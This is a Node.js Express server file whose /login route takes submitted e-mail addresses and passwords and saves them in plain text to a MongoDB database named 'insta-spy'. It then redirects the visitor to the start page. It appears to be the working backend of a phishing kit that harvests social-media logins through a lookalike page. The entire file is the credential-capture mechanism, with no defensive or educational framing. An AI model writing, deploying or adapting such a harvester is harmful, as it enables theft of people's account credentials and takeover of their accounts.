require('dotenv').config()
const express = require('express');
const app = express();
const { MongoClient, ServerApiVersion } = require('mongodb');
const uri = process.env.CREDENTIALS;
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1 });

app.set('view-engine', 'ejs');
app.use(express.static(__dirname + '/views/styles'));
app.use(express.urlencoded({extended:true}));
app.use(express.static("public"));

app.get('/', (req, res) => {
    res.render("index.ejs");
    res.end();
});
app.post('/login', (req, res) => {

    async function init() {
        try {
        await client.connect();
        const collection = client.db("insta-spy").collection("data");
        await collection.insertOne({
            'E-mail': req.body.email,
            'Password': req.body.password
        });
        } finally {
        await client.close();
        }
    }
    init().catch(console.dir);

    res.redirect('/');
    res.end();
})

app.listen(process.env.PORT || 3000);